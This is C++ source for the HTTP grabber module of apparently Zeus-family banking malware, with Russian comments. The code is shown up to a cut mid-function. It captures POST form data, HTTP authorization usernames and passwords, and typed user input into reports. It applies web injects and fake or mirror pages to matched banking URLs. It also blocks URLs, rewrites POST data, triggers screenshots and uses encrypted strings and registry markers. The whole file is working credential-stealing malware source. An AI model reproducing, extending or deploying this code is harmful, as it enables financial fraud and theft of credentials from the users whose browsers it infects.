#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "userhook.h"
#include "localconfig.h"
#include "report.h"
#include "httpgrabber.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\httptools.h"
#include "..\common\wininet.h"
#include "..\common\sync.h"
#include "..\common\debug.h"
#include "..\common\registry.h"

//Хэш последней HTTP-авторизации (ламерский способ для предотврашения дублирования отчетов).
static DWORD lastHttpAuthorizationHash;

//Данные о блокируемой URL.
static struct
{
  CRITICAL_SECTION cs;   //Крит. секция для доступа к переменным.
  LPSTR urlMaskForBlock; //Маска URL, по которой будет заблокирован доступ (== HttpInject::HEADER.urlMask).
  LPSTR blockOnUrl;      //Маска URL, из-за которой будет заблокирован инжект (== HttpInject::HEADER.blockOnUrl). 
}blockInjectInfo;

void HttpGrabber::init(void)
{
  lastHttpAuthorizationHash       = 0;
  blockInjectInfo.urlMaskForBlock = NULL;
  blockInjectInfo.blockOnUrl      = NULL;
  CWA(kernel32, InitializeCriticalSection)(&blockInjectInfo.cs);
}

void HttpGrabber::uninit(void)
{
  Mem::free(blockInjectInfo.urlMaskForBlock);
  Mem::free(blockInjectInfo.blockOnUrl);
  CWA(kernel32, DeleteCriticalSection)(&blockInjectInfo.cs);
}

LPSTR HttpGrabber::_genarateMirrorFakeUrlA(const LPSTR fakeUrl, const LPSTR originalUrl, const LPSTR urlMask)
{
  int urlMaskSize     = Str::_LengthA(urlMask);
  int originalUrlSize = Str::_LengthA(originalUrl);
  int fakeUrlSize     = Str::_LengthA(fakeUrl);
  
  if(urlMaskSize > 0 && originalUrlSize > 0 && fakeUrlSize > 0)
  {
    //Ишим конец дейтсвия маски без учета последнего компанента пути URL.
    LPSTR start = urlMask + urlMaskSize;
    while(start > urlMask && *start != '/')start--;
    if(start > urlMask)
    {
      Str::MATCHDATAA md;

      md.anyCharsSymbol = '*';
      md.anyCharSymbol  = '#';
      md.mask           = urlMask;
      md.maskSize       = start - urlMask + 1;
      md.string         = originalUrl;
      md.stringSize     = originalUrlSize;
      md.flags          = 0;

      if(Str::_matchA(&md))
      {
        int fakePathSize = originalUrlSize - md.endOfMatch;
        LPSTR fakePath   = originalUrl + md.endOfMatch;
        LPSTR p          = (LPSTR)Mem::alloc((fakeUrlSize + fakePathSize + 2/*/+\0*/) * sizeof(char));

        if(p != NULL)
        {
          Mem::_copy(p, fakeUrl, fakeUrlSize);
          if(fakeUrl[fakeUrlSize - 1] != '/' && *fakePath != '/')p[fakeUrlSize++] = '/';
          Str::_CopyA(p + fakeUrlSize, fakePath, fakePathSize);
          return p;
        }  
      }
    }
  }
  return NULL;
}

bool HttpGrabber::_matchUrlA(const LPSTR mask, const LPSTR url, DWORD urlSize, DWORD advFlags)
{
  Str::MATCHDATAA md;

  md.anyCharsSymbol = '*';
  md.anyCharSymbol  = '#';
  md.mask           = mask;
  md.maskSize       = Str::_LengthA(mask);
  md.string         = url;
  md.stringSize     = urlSize;
  md.flags          = Str::MATCH_FULL_EQUAL | advFlags;

  return Str::_matchA(&md);
}

bool HttpGrabber::_matchPostDataA(const LPSTR mask, const LPSTR postData, DWORD postDataSize)
{
  Str::MATCHDATAA md;

  md.anyCharsSymbol = '*';
  md.anyCharSymbol  = '?';
  md.mask           = mask;
  md.maskSize       = Str::_LengthA(mask);
  md.string         = postData;
  md.stringSize     = postDataSize;
  md.flags          = Str::MATCH_FULL_EQUAL | Str::MATCH_UNIVERSAL_NEWLINE;

  return Str::_matchA(&md);
}

bool HttpGrabber::_matchContextA(const LPSTR mask, const void *context, DWORD contextSize, DWORD advFlags)
{
  Str::MATCHDATAA md;

  md.anyCharsSymbol = '*';
  md.anyCharSymbol  = '?';
  md.mask           = mask;
  md.maskSize       = Str::_LengthA(mask);
  md.string         = (LPSTR)context;
  md.stringSize     = contextSize;
  md.flags          = Str::MATCH_UNIVERSAL_NEWLINE | Str::MATCH_SEARCH_SUBSSTRING | advFlags;

  return Str::_matchA(&md);
}

bool HttpGrabber::_matchContextExA(const void *mask, DWORD maskSize, const void *context, DWORD contextSize, LPDWORD offsetBegin, LPDWORD offsetEnd, DWORD advFlags)
{
  Str::MATCHDATAA md;

  md.anyCharsSymbol = '*';
  md.anyCharSymbol  = '?';
  md.mask           = (LPSTR)mask;
  md.maskSize       = maskSize;
  md.string         = (LPSTR)context;
  md.stringSize     = contextSize;
  md.flags          = Str::MATCH_UNIVERSAL_NEWLINE | Str::MATCH_SEARCH_SUBSSTRING | advFlags;

  if(Str::_matchA(&md))
  {
    if(offsetBegin)*offsetBegin = md.beginOfMatch;
    if(offsetEnd)*offsetEnd = md.endOfMatch;
    return true;
  }
  return false;
}

bool HttpGrabber::_addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR urlMask)
{
  if(*urlMask == 0)return false;

  bool ok = false;
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(*localConfig, listId, BinStorage::ITEMF_IS_SETTING, &itemListSize);

  //Если элемент существует, ищим клон.
  if(Str::_isValidMultiStringA(itemList, itemListSize))
  {
    //Ищим элемент в списке.
    LPSTR curItem = itemList;
    int urlMaskLen = Str::_LengthA(urlMask);
    while(Str::_CompareA(urlMask, curItem, urlMaskLen, -1) != 0 && (curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);

    //Клон не найден.
    if(curItem != NULL)
    {
#     if defined WDEBUG0
      WDEBUG0(WDDT_INFO, "Item already exists.");
#     endif
    }
    else if(Mem::reallocEx(&itemList, itemListSize + urlMaskLen + 1))
    {
      Str::_CopyA(itemList + itemListSize - 1, urlMask, urlMaskLen);
      itemListSize += urlMaskLen + 1;
      itemList[itemListSize - 1] = 0;
      ok = BinStorage::_modifyItemById(localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize);
    }
  }
  //Если элемент поврежден или отсутвует, подменяем на новый.
  else
  {
    LPSTR newItem;
    DWORD newItemSize;

    if((newItem = Str::_multiStringCreateA(urlMask, &newItemSize)))
    {
      if(itemList == NULL)ok = BinStorage::_addItem       (localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize);
      else                ok = BinStorage::_modifyItemById(localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize);
      Mem::free(newItem);
    }
  }
  Mem::free(itemList);
  return ok;

}

bool HttpGrabber::_removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR maskOfurlMask)
{
  bool ok = false;
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(*localConfig, listId, BinStorage::ITEMF_IS_SETTING, &itemListSize);

  //Проверяем правильность списка.
  if(Str::_isValidMultiStringA(itemList, itemListSize))
  {
    //Создаем копию списка для копирования в него, элементов не попавших под маску.
    LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);
    if(newItemList != NULL)  
    {
      //Ишим элементы.
      LPSTR curItem = itemList;
      LPSTR offset  = newItemList;
      int len;

      do
      {
        len = Str::_LengthA(curItem);
        if(_matchUrlA(maskOfurlMask, curItem, len, 0))
        {
          ok = true;
        }
        else
        {
          Str::_CopyA(offset, curItem, len);
          offset += len + 1;
          *offset = 0; //Завершающий байт мульти-строки.
        }
      }
      while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);

      if(ok == true)
      {
        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
        ok = BinStorage::_modifyItemById(localConfig, listId, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
      }
      Mem::free(newItemList);
    }
  }
  Mem::free(itemList);
  return ok;
}

bool HttpGrabber::_isUrlInList(DWORD listId, const BinStorage::STORAGE *localConfig, const LPSTR url, DWORD urlSize, DWORD advFlags)
{
  bool ok = false;
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(localConfig, listId, BinStorage::ITEMF_IS_SETTING, &itemListSize);

  if(Str::_isValidMultiStringA(itemList, itemListSize))
  {
    LPSTR curMask = itemList;
    do if(_matchUrlA(curMask, url, urlSize, advFlags))
    {
      ok = true;
      break;
    }
    while((curMask = Str::_multiStringGetIndexA(curMask, 1)) != NULL);
  }
  Mem::free(itemList);
  return ok;
}

/*
  Проверка запроса на необходимость инждекта.

  IN OUT requestData - запрос.

  Return             - true - инжекты применины,
                       false - инжекты не применены
*/
static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
{
  if(requestData->dynamicConfig == NULL)return false;
  
  DWORD listSize;
  LPBYTE list = (LPBYTE)BinStorage::_getItemDataEx(requestData->dynamicConfig, CFGID_HTTP_INJECTS_LIST, BinStorage::ITEMF_IS_OPTION, &listSize);

  requestData->injectsCount = 0;
  requestData->injects      = NULL;

  if(list != NULL && listSize > sizeof(HttpInject::HEADER))
  {
    WORD knownFlags               = requestData->verb == HttpGrabber::VERB_POST ? HttpInject::FLAG_REQUEST_POST : HttpInject::FLAG_REQUEST_GET;
    DWORD index                   = 0;
    HttpInject::HEADER *curInject = (HttpInject::HEADER *)list;
    LPBYTE endOfList              = list + listSize;

    while(HttpInject::_isCorrectHeader(curInject))
    {
      LPSTR p          = (LPSTR)curInject; //Переменная для легокого доступа к строкам.
      LPSTR urlMask    = p + curInject->urlMask;
      DWORD matchFlags = curInject->flags &  HttpInject::FLAG_URL_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;
      
      if((curInject->flags & knownFlags) == knownFlags && HttpGrabber::_matchUrlA(urlMask, requestData->url, requestData->urlSize, matchFlags))
      {
        //Проверяем по блеклисту.
        if(requestData->localConfig != NULL && HttpGrabber::_isUrlInList(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, requestData->localConfig, requestData->url, requestData->urlSize, matchFlags))
        {
#         if defined WDEBUG1
          WDEBUG1(WDDT_INFO, "Inject for [%S] is blacklisted.", requestData->url);
#         endif
          goto SKIP_ITEM;
        }

        //Проверяем пост-данные.
        if(curInject->postDataBlackMask > 0 && HttpGrabber::_matchPostDataA(p + curInject->postDataBlackMask, (LPSTR)requestData->postData, requestData->postDataSize) == true)
        {
          goto SKIP_ITEM;
        }
        if(curInject->postDataWhiteMask > 0 && HttpGrabber::_matchPostDataA(p + curInject->postDataWhiteMask, (LPSTR)requestData->postData, requestData->postDataSize) == false)
        {
          goto SKIP_ITEM;
        }

        //Проверяем суточные ограничения.
        if(curInject->flags & HttpInject::FLAG_ONCE_PER_DAY && curInject->blockOnUrl > 0)
        {
          SYSTEMTIME lastTime;

          WCHAR key[CORE_REGISTRY_KEY_BUFFER_SIZE];
          WCHAR value[max(CORE_REGISTRY_VALUE_BUFFER_SIZE, (MD5HASH_SIZE * 2 + 1))];

          Core::getRegistryValue(Core::RV_LOCALCONFIG, key, value);

          //Получаем хэш.
          {
            LPSTR blockUrl = p + curInject->blockOnUrl;
            BYTE hash[MD5HASH_SIZE];
            if(!Crypt::_md5Hash(hash, blockUrl, Str::_LengthA(blockUrl)))goto SKIP_ITEM;
            Str::_toHexW(hash, MD5HASH_SIZE, value);
          }
          
          //Проверяем значение.
          if(Registry::_getValueAsBinary(HKEY_CURRENT_USER, key, value, NULL, &lastTime, sizeof(SYSTEMTIME)) == sizeof(SYSTEMTIME))
          {
            SYSTEMTIME curTime;
            CWA(kernel32, GetLocalTime)(&curTime);
            if(lastTime.wDay == curTime.wDay && lastTime.wMonth == curTime.wMonth)
            {
#             if defined WDEBUG1
              WDEBUG1(WDDT_INFO, "Inject [%s] alredy executed today.", urlMask);
#             endif
              goto SKIP_ITEM;
            }
          }
        }

        //Все хорошо, собираем данные.
        {
          HttpGrabber::INJECTFULLDATA ifd;
#         if defined WDEBUG2
          WDEBUG2(WDDT_INFO, "requestData->url=[%S] matched [%S].", requestData->url, urlMask);
#         endif
          Mem::_zero(&ifd, sizeof(HttpGrabber::INJECTFULLDATA));

          ifd.flags       = curInject->flags;
          ifd.urlMask     = Str::_CopyExA(p + curInject->urlMask, -1);
          ifd.fakeUrl     = curInject->fakeUrl == 0     ? NULL : Str::_CopyExA(p + curInject->fakeUrl,     -1);
          ifd.blockOnUrl  = curInject->blockOnUrl == 0  ? NULL : Str::_CopyExA(p + curInject->blockOnUrl,  -1);
          ifd.contextMask = curInject->contextMask == 0 ? NULL : Str::_CopyExA(p + curInject->contextMask, -1);
         
          //Фейк.
          if(curInject->flags & (HttpInject::FLAG_IS_FAKE | HttpInject::FLAG_IS_MIRRORFAKE))
          {
            //Мульти фейки нельзя использовать, удаляем все инжекты.
            _freeInjectFullDataList(requestData->injects, requestData->injectsCount);
            requestData->injectsCount = 0;

            if((requestData->injects = (HttpGrabber::INJECTFULLDATA *)Mem::copyEx(&ifd, sizeof(HttpGrabber::INJECTFULLDATA))) != NULL)requestData->injectsCount++;
            else HttpGrabber::_freeInjectFullData(&ifd);

            break;
          }
          //Инжект.
          else if(curInject->flags & (HttpInject::FLAG_IS_INJECT | HttpInject::FLAG_IS_CAPTURE))
          {
            if((ifd.injects = (HttpInject::INJECTBLOCK *)BinStorage::_getItemDataEx(requestData->dynamicConfig, 1 + index, BinStorage::ITEMF_IS_HTTP_INJECT, &ifd.injectsSize)) != NULL &&
               HttpInject::_isCorrectBlockList(ifd.injects, ifd.injectsSize) &&
               Mem::reallocEx(&requestData->injects, sizeof(HttpGrabber::INJECTFULLDATA) * (requestData->injectsCount + 1)))
            {
              Mem::_copy(&requestData->injects[requestData->injectsCount++], &ifd, sizeof(HttpGrabber::INJECTFULLDATA));
            }
            else
            {
#             if defined WDEBUG0
              WDEBUG0(WDDT_ERROR, "Dynamic configuration corrupted!");
#             endif
              
              Mem::free(ifd.injects);
              HttpGrabber::_freeInjectFullData(&ifd);

              _freeInjectFullDataList(requestData->injects, requestData->injectsCount);
              requestData->injectsCount = 0;
              break;
            }
          }
          //Неизвестно.
          else 
          {
            HttpGrabber::_freeInjectFullData(&ifd);
#           if defined WDEBUG1
            WDEBUG1(WDDT_ERROR, "Unknown inject detected, curInject->flags=0x%08X!", curInject->flags);
#           endif
          }
        }
        
SKIP_ITEM:;
      }

      //Вычисляем следующий элемент.
      curInject = (HttpInject::HEADER *)(((LPBYTE)curInject) + curInject->size);
      if(((LPBYTE)curInject) + sizeof(HttpInject::HEADER) > endOfList || ((LPBYTE)curInject) + curInject->size > endOfList)break;
      index++;
    }
  }

  Mem::free(list);
  return (requestData->injectsCount > 0);
}

/*
  Замена POST-данных "application/x-www-form-urlencoded".

  IN OUT requestData - запрос.

  Return             - true - данные заменены,
                       false - данные не заменены.
*/
static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
{
  if(requestData->dynamicConfig == NULL || requestData->postDataSize == 0)return false;

  bool retVal = false;
  DWORD listSize;
  LPSTR list = (LPSTR)BinStorage::_getItemDataEx(requestData->dynamicConfig, CFGID_HTTP_POSTDATA_FILTER, BinStorage::ITEMF_IS_OPTION, &listSize);

  if(Str::_isValidMultiStringA(list, listSize) && Str::_multiStringGetCountA(list) % 2 == 0)
  {
    LPSTR curMask = list;

    do if(HttpGrabber::_matchUrlA(curMask, requestData->url, requestData->urlSize, 0))
    {
#     if defined WDEBUG2
      WDEBUG2(WDDT_INFO, "requestData->url=[%S] matched [%S].", requestData->url, curMask);
#     endif
      
      LPSTR *varables;
      DWORD varablesCount;

      //Получем список переменных.
      if((varablesCount = Str::_splitToStringsA((LPSTR)requestData->postData, requestData->postDataSize, &varables, Str::STS_USE_SEPARATOR, '&')) != (DWORD)-1)
      {
        LPSTR *badVarables;
        DWORD badVarablesCount;
        curMask = Str::_multiStringGetIndexA(curMask, 1);

        //Получаем список "плохих" переменных.
        if(curMask != NULL && (badVarablesCount = Str::_splitToStringsA(curMask, Str::_LengthA(curMask), &badVarables, Str::STS_USE_SEPARATOR, ';')) != (DWORD)-1)
        {
          LPSTR newPostData     = (LPSTR)Mem::alloc(requestData->postDataSize);
          DWORD newPostDataSize = 0;

          if(newPostData != NULL)
          {
            //Ищим.
            for(DWORD i = 0; i < varablesCount; i++)if(varables[i] != NULL && varables[i][0] != 0)
            {
              bool skip = false;
              int len   = 0;

              //Длина переменной.
              while(varables[i][len] != '=' && varables[i][len] != 0)len++;

              for(DWORD j = 0; j < badVarablesCount; j++)if(badVarables[j] != NULL && badVarables[j][0] != 0 && HttpGrabber::_matchPostDataA(badVarables[j], varables[i], len))
              {
                skip = true;
                break;
              }

              //Копируем переменную.
              if(skip == false)
              {
                if(newPostDataSize != 0)newPostData[newPostDataSize++] = '&';

                len = Str::_LengthA(varables[i]);
                Mem::_copy(newPostData + newPostDataSize, varables[i], len);
                newPostDataSize += len;
              }
            }

            //Не чего не изменилось.
            if(newPostDataSize == requestData->postDataSize)
            {
              Mem::free(newPostData);
            }
            //Изменения есть.
            else
            {
              if(newPostDataSize == 0)
              {
                Mem::free(newPostData);
                newPostData = NULL;
              }

              requestData->postData     = newPostData;
              requestData->postDataSize = newPostDataSize;
              retVal = true;
            }
          }
          Mem::freeArrayOfPointers(badVarables, badVarablesCount);
        }
        Mem::freeArrayOfPointers(varables, varablesCount);
      }
      break;
    }
    while((curMask = Str::_multiStringGetIndexA(curMask, 2)) != NULL);
  }

  Mem::free(list);
  return retVal;
}

DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
{
#if defined WDEBUG6
  WDEBUG6(WDDT_INFO,
          "requestData->handle=[0x%p], requestData->url=[%S], requestData->referer=[%S], requestData->contentType=[%S], requestData->verb=[%u], requestData->postDataSize=[%u].",
          requestData->handle,
          requestData->url,
          requestData->referer,
          requestData->contentType,
          requestData->verb,
          requestData->postDataSize
         );
#endif

  DWORD retVal = 0;
  signed char writeReport = -1;/*-1 - по умолчанию, 0 - не писать, 1 - принудительно писать*/;

  //Проверяем на блокировку.
  CWA(kernel32, EnterCriticalSection)(&blockInjectInfo.cs);
  if(blockInjectInfo.blockOnUrl != NULL && blockInjectInfo.urlMaskForBlock != NULL && _matchUrlA(blockInjectInfo.blockOnUrl, requestData->url, requestData->urlSize, 0))
  {
#   if defined WDEBUG1
    WDEBUG1(WDDT_INFO, "Detected blocking url [%S] for current url.", blockInjectInfo.blockOnUrl);
#   endif    

    //Нельзя юзать requestData->localConfig т.к. она открта только для чтения.
    BinStorage::STORAGE *localConfig = LocalConfig::beginReadWrite();
    if(localConfig != NULL)
    {
      if(_addUrlMaskToList(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, &localConfig, blockInjectInfo.urlMaskForBlock))
      {
        LocalConfig::endReadWrite(localConfig);
      }
      else
      {
        Mem::free(localConfig);
        LocalConfig::endReadWrite(NULL);
      }
    }
    
    Mem::free(blockInjectInfo.urlMaskForBlock);
    Mem::free(blockInjectInfo.blockOnUrl);
    blockInjectInfo.urlMaskForBlock = NULL;
    blockInjectInfo.blockOnUrl      = NULL;
  }
  CWA(kernel32, LeaveCriticalSection)(&blockInjectInfo.cs);
  
  //Проверяем запрос по фильтру.
  if(requestData->dynamicConfig != NULL)
  {
    DWORD httpFilterSize;
    LPSTR httpFilter = (LPSTR)BinStorage::_getItemDataEx(requestData->dynamicConfig, CFGID_HTTP_FILTER, BinStorage::ITEMF_IS_OPTION, &httpFilterSize);

    if(Str::_isValidMultiStringA(httpFilter, httpFilterSize))
    {      
      LPSTR curFilter = httpFilter;
      do if(curFilter[1] != 0)
      { 
        //Опеределяем тип фильтра.
        char filterType;
        switch(curFilter[0])
        {
          case '!': filterType = 1; break; //Не писать в отчет,
          case '@': filterType = 2; break; //Скриншот.
          case '-': filterType = 3; break; //Сохранение всех куков связаных с URL, и блокировка доступа.
          case '^': filterType = 4; break; //Блокировка доступа.
          default:  filterType = 0; break; //Принудительно писать в отчет.
        }
        if(filterType != 0)curFilter++;

        //Сравниваем URL.
        if(_matchUrlA(curFilter, requestData->url, requestData->urlSize, 0))
        {
#         if defined WDEBUG3
          WDEBUG3(WDDT_INFO, "requestData->url=[%S] matched [%S] for filter type %u.", requestData->url, curFilter, filterType);
#         endif

          switch(filterType)
          {
            case 0:
            {
              writeReport = 0;
              break;
            }
            
            case 1:
            {
              writeReport = 1;
              break;
            }
            
            case 2:
            {
              char host[260];
              URL_COMPONENTSA uc;

              Mem::_zero(&uc, sizeof(URL_COMPONENTSA));
              uc.dwStructSize     = sizeof(URL_COMPONENTSA);
              uc.lpszHostName     = host;
              uc.dwHostNameLength = sizeof(host) / sizeof(char) - 1;

              if(CWA(wininet, InternetCrackUrlA)(requestData->url, requestData->urlSize, 0, &uc) == TRUE && uc.dwHostNameLength > 0)
              {
                UserHook::enableImageOnClick(USERCLICK2IMAGE_LIMIT, host);
              }
              break;
            }

            case 3:
            {
              //FIXME: saveSessionCookies(requestData->url);
              //НЕ НАДА ТУТ break!
            }
            
            case 4:
            {
              retVal      |= ANALIZEFLAG_URL_BLOCKED;
              writeReport  = 1;
              break;
            }
          }

          if(filterType != 2)break; //В случаи с скриншотом, продолжаем поиск.
        }
      }
      while((curFilter = Str::_multiStringGetIndexA(curFilter, 1)));      
    }

    Mem::free(httpFilter);
  }

  //Если URL, пока не является заблакируемой. Пытаемся ее заблокировать.
  if((retVal & HttpGrabber::ANALIZEFLAG_URL_BLOCKED) == 0 && requestData->localConfig != NULL)
  {
    if(_isUrlInList(LocalConfig::ITEM_URLLIST_BLOCKED, requestData->localConfig, requestData->url, requestData->urlSize, 0))
    {
      //FIXME: check, this URL founded in blacklist.
      retVal |= HttpGrabber::ANALIZEFLAG_URL_BLOCKED;
    }
  }

  //Проверяем тип содержимого.
  if(requestData->contentTypeSize >= (CryptedStrings::len_httpgrabber_urlencoded - 1))
  {
    CSTR_GETA(formUrlEncoded, httpgrabber_urlencoded);
    if(
        Mem::_compare(requestData->contentType, formUrlEncoded, (CryptedStrings::len_httpgrabber_urlencoded - 1)) == 0 &&
        (requestData->contentType[CryptedStrings::len_httpgrabber_urlencoded - 1] == ';' || requestData->contentType[CryptedStrings::len_httpgrabber_urlencoded - 1] == 0)
       )retVal |= HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED;
  }

  //Проверяем наличие HTTP-авторизации.
  LPWSTR authorizationData  = NULL;
  int authorizationDataSize = 0;
  if(requestData->authorizationData.userName != NULL && *requestData->authorizationData.userName != 0 && requestData->authorizationData.password != NULL && *requestData->authorizationData.password != 0)
  {
    CSTR_GETW(format, httpgrabber_auth_normal);
    authorizationDataSize = Str::_sprintfExW(&authorizationData, format, requestData->authorizationData.userName, requestData->authorizationData.password);
  }
  else if(requestData->authorizationData.unknownType != NULL && *requestData->authorizationData.unknownType != 0)
  {
    CSTR_GETW(format, httpgrabber_auth_encoded);
    authorizationDataSize = Str::_sprintfExW(&authorizationData, format, requestData->authorizationData.unknownType);
  }

  //Проверяем хэш  HTTP-авторизации.
  if(authorizationDataSize > 0)
  {
    DWORD hash = Crypt::crc32Hash(authorizationData, authorizationDataSize * sizeof(WCHAR));
    if(lastHttpAuthorizationHash == hash)
    {
      Mem::free(authorizationData);
      authorizationData = NULL;
    }
    else
    {
      lastHttpAuthorizationHash = hash;
      retVal                   |= ANALIZEFLAG_AUTHORIZATION;
    }
  }

  //Опеределям нужно ли писать отчет.  
  {    
    if(writeReport == -1)
    {
      if((requestData->verb == VERB_POST && requestData->postDataSize > 0) || retVal & ANALIZEFLAG_AUTHORIZATION)retVal |= ANALIZEFLAG_SAVED_REPORT;
    }
    else if(writeReport == 1)retVal |= ANALIZEFLAG_SAVED_REPORT;
  }
  
  //Пишим отчет
  if(retVal & ANALIZEFLAG_SAVED_REPORT)
  {
    LPSTR postData = NULL;
    bool ok = false;
    
    //Форматируем POST-запрос.
    if(requestData->postDataSize == 0)
    {
      CSTR_GETA(decodedString, httpgrabber_report_empty);
      postData = Str::_CopyExA(decodedString, CryptedStrings::len_httpgrabber_report_empty - 1);
    }
    else if(retVal & HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED)
    {
      if((postData = Str::_CopyExA((LPSTR)requestData->postData, requestData->postDataSize)) != NULL)
      {
        for(DWORD i = 0; i < requestData->postDataSize; i++)
        {
          if(postData[i] == '&')postData[i] = '\n';
          else if(postData[i] == '+')postData[i] = ' ';
        }
      }
    }
    else if(requestData->contentTypeSize == 0)
    {
      CSTR_GETA(decodedString, httpgrabber_report_unknown);
      postData = Str::_CopyExA(decodedString, CryptedStrings::len_httpgrabber_report_unknown - 1);
    }
  
    //Формируем отчет.
    if(postData != NULL)
    {
      LPWSTR userInput;
      UserHook::getInput(&userInput);
      
      LPWSTR urlUnicode = Str::_ansiToUnicodeEx(requestData->url, requestData->urlSize);

      if(urlUnicode != NULL)
      {
        URL_COMPONENTSA uc;

        Mem::_zero(&uc, sizeof(URL_COMPONENTSA));
        uc.dwStructSize = sizeof(URL_COMPONENTSA);

        if(CWA(wininet, InternetCrackUrlA)(requestData->url, requestData->urlSize, 0, &uc) == TRUE)
        {
          //Пишим.
          CSTR_GETW(reportFormat, httpgrabber_report_format);
          CSTR_GETW(reportBlocked, httpgrabber_report_blocked);
          
          ok = Report::writeStringFormat(uc.nScheme == INTERNET_SCHEME_HTTPS ? BLT_HTTPS_REQUEST : BLT_HTTP_REQUEST,
                                         urlUnicode,
                                         NULL,
                                         reportFormat,
                                         urlUnicode,
                                         retVal & ANALIZEFLAG_URL_BLOCKED ? reportBlocked : L"",
                                         requestData->referer == NULL ? "-" : requestData->referer,
                                         userInput == NULL ? L"" : userInput,
                                         authorizationData == NULL ? L"" : authorizationData,
                                         postData);
        }
        Mem::free(urlUnicode);
      }

      Mem::free(userInput);
      Mem::free(postData);
    }

    if(ok == false)retVal &= ~ANALIZEFLAG_SAVED_REPORT;
  }
  
  Mem::free(authorizationData);
    
  //Если URL оказалась заблокирована, применять следущие флаги нет смысла.
  if(retVal & ANALIZEFLAG_URL_BLOCKED)
  {
#   if defined WDEBUG0
    WDEBUG0(WDDT_INFO, "Current url blocked.");
#   endif    
    
    goto END;
  }

  //Проверка на инжекты и фейки.
  if(checkRequestForInject(requestData))
  {
    retVal |= ANALIZEFLAG_URL_INJECT;
#   if defined WDEBUG1
    WDEBUG1(WDDT_INFO, "Accepted %u injects for current URL.", requestData->injectsCount);
#   endif
  }

  //Проверка на замену POST-данных.
  if(retVal & HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED && replacePostData(requestData))
  {
    retVal |= ANALIZEFLAG_POSTDATA_REPLACED;
#   if defined WDEBUG1
    WDEBUG1(WDDT_INFO, "POST-data replaced [%S].", requestData->postData);
#   endif
  }

END: 
  return retVal;
}

bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count)
{
  DWORD changesCount = 0; //Кол. примененых инжектов.

  for(DWORD i = 0; i < count; i++)
  {
    INJECTFULLDATA *curData = (INJECTFULLDATA *)&dataList[i];
    DWORD matchFlags = curData->flags & HttpInject::FLAG_CONTEXT_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;

    //Проверка маски контента.
    if(curData->contextMask != NULL && !_matchContextA(curData->contextMask, *context, *contextSize, matchFlags))
    {
#     if defined WDEBUG0
      WDEBUG0(WDDT_INFO, "Context no matched.");
#     endif
      continue;
    }

    LPBYTE grabbedData     = NULL;
    DWORD  grabbedDataSize = 0;
    LPBYTE curBlock        = (LPBYTE)curData->injects;
    LPBYTE endBlock        = curBlock + curData->injectsSize;

    //Применяем инжекты, грабим данные.
    while(curBlock < endBlock)
    {
      //Ищим место замены.
      DWORD offsetBegin; //Начало данных для замены.
      DWORD offsetEnd;   //Конец данных для замены.
      HttpInject::INJECTBLOCK *blockPrefix = (HttpInject::INJECTBLOCK *)curBlock;
      HttpInject::INJECTBLOCK *blockPostfix  = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPrefix + blockPrefix->size);
      HttpInject::INJECTBLOCK *blockNew    = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPostfix + blockPostfix->size);
      
      curBlock = (LPBYTE)blockNew + blockNew->size; //Следующий элемент.
      
      //Получаем позицию начала.
      if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))
      {
        offsetBegin = 0;
      }
      else if(!_matchContextExA((LPBYTE)blockPrefix + sizeof(HttpInject::INJECTBLOCK), blockPrefix->size - sizeof(HttpInject::INJECTBLOCK), *context, *contextSize, NULL, &offsetBegin, matchFlags))
      {
        continue;
      }
      
      //Получаем позицию конца.
      if(blockPostfix->size == sizeof(HttpInject::INJECTBLOCK))
      {
        if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))offsetEnd = *contextSize;
        else offsetEnd = offsetBegin;
      }
      else if(_matchContextExA((LPBYTE)blockPostfix + sizeof(HttpInject::INJECTBLOCK), blockPostfix->size - sizeof(HttpInject::INJECTBLOCK), *context + offsetBegin, *contextSize - offsetBegin, &offsetEnd, NULL, matchFlags))
      {        
        if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))offsetBegin = offsetEnd;
        else offsetEnd += offsetBegin;
      }
      else
      {
        continue;
      }      
      
      DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //Размер ставляемых данных.
      DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //Размер наденых данных.

      //Замена.
      if(curData->flags & HttpInject::FLAG_IS_INJECT)
      {
        DWORD newSize = *contextSize - matchedDataSize + blockNewDataSize;
        LPBYTE newBuf  = (LPBYTE)Mem::alloc(newSize);

